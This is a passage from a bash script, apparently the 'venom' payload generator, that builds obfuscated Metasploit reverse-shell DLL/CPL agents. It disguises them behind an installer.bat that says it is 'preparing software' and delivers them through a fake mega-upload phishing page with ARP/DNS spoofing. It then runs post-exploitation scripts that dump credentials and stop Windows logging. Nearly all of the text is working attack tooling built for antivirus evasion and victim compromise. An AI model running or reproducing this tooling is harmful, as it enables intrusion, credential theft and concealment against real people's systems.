    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi

else

echo "nothing to do here" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "${BlueF}[☠]${white} loading -> Apache2Server!"${Reset};
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
        echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
          if [ "$MsFlF" = "ON" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
        echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


## CLEANING EVERYTHING UP
echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset};
mv $IPATH/templates/exec[bak].c $InJEc
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
sh_menu

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_menu
  clear
fi
}




# -----------------------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# mingw32 obfustated using astr0baby method and build installer.bat
# to use in winrar/sfx 'make payload executable by pressing on it'
# -----------------------------------------------------------------
sh_shellcode2 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
# input agent final name
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: astr0baby" --width 300) > /dev/null 2>&1
# chose agent final extension (.dll or .cpl)
Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="astr0baby";fi
if [ "$Ext" = "$N4m.dll" ]; then
   Ext="dll"
else
   Ext="cpl"
fi


echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
sleep 1
echo "[☠] Building shellcode -> C format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi


echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
fi


echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc5 ]; then
      echo "[☠] exec_dll.c -> found!"
      sleep 2
   else
      echo "[☠] exec_dll.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc5 $IPATH/templates/exec_dll[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates
# use SED to replace IpADr3 and P0rT
echo "[☠] Injecting shellcode -> $N4m.dll!"
sleep 2
sed -i "s|IpADr3|$lhost|g" exec_dll.c
sed -i "s|P0rT|$lport|g" exec_dll.c

# obfuscation ??
UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 150 | head -n 1)
sed -i "s|UUID-RANDOM|$UUID_1|g" exec_dll.c




echo "[✔] Using random UUID keys (evade signature detection)"
sleep 2
echo ""
echo "    Generated key:$UUID_1"
echo ""
sleep 1



if [ "$Ext" = "dll" ]; then
  # build winrar-SFX installer.bat script
  echo "[☠] Building winrar/SFX -> installer.bat..."
  sleep 2
  echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
  echo ":: this script will run payload using rundll32" >> $IPATH/output/installer.bat
  echo ":: ---" >> $IPATH/output/installer.bat
  echo "@echo off" >> $IPATH/output/installer.bat
  echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
  echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/installer.bat
  echo "exit" >> $IPATH/output/installer.bat
  sleep 2
fi


# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling/obfuscating using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -lws2_32 -shared (dll) flag :D
$ComP exec_dll.c -o $N4m.dll -lws2_32 -shared
strip $N4m.dll

if [ "$Ext" = "dll" ]; then
   mv $N4m.dll $IPATH/output/$N4m.dll
else
   mv $N4m.dll $IPATH/output/$N4m.cpl
fi




# CHOSE HOW TO DELIVER YOUR PAYLOAD
if [ "$Ext" = "dll" ]; then
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/installer.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
else
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.cpl\n\nchose how to deliver: $N4m.cpl" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
fi


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


      # user settings
      if [ "$Ext" = "dll" ]; then
      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      else
      N4m2="$N4m.$Ext"
      fi

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 310) > /dev/null 2>&1



  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.$Ext > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# and build installer.bat to use in winrar/sfx
# 'make payload executable by pressing on it'
# -------------------------------------------------
sh_shellcode3 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: DllExploit" --entry --width 300) > /dev/null 2>&1
# chose agent final extension (.dll or .cpl)
Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="DllExploit";fi
if [ "$Ext" = "$N4m.dll" ]; then
   Ext="dll"
else
   Ext="cpl"
fi


echo "[☠] Building shellcode -> dll format ..."
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : DLL -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
# new obfuscating method
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a x86 -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
fi
echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


if [ "$Ext" = "dll" ]; then
  echo "[☠] Injecting shellcode -> $N4m.dll!"
  sleep 2
  # build winrar-SFX installer.bat script
  echo "[☠] Building winrar/SFX -> installer.bat..."
  sleep 2
  echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
  echo ":: this script will run payload using rundll32" >> $IPATH/output/installer.bat
  echo ":: ---" >> $IPATH/output/installer.bat
  echo "@echo off" >> $IPATH/output/installer.bat
  echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
  echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/installer.bat
  echo "exit" >> $IPATH/output/installer.bat
  sleep 2
else
  echo "[☠] Injecting shellcode -> $N4m.$Ext!"
  sleep 2
  mv $IPATH/output/$N4m.dll $IPATH/output/$N4m.$Ext
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
if [ "$Ext" = "dll" ]; then
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/installer.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
else
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.cpl\n\nchose how to deliver: $N4m.cpl" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
fi


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log;  use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      if [ "$Ext" = "dll" ]; then
      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      else
      N4m2="$N4m.$Ext"
      fi

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 310) > /dev/null 2>&1




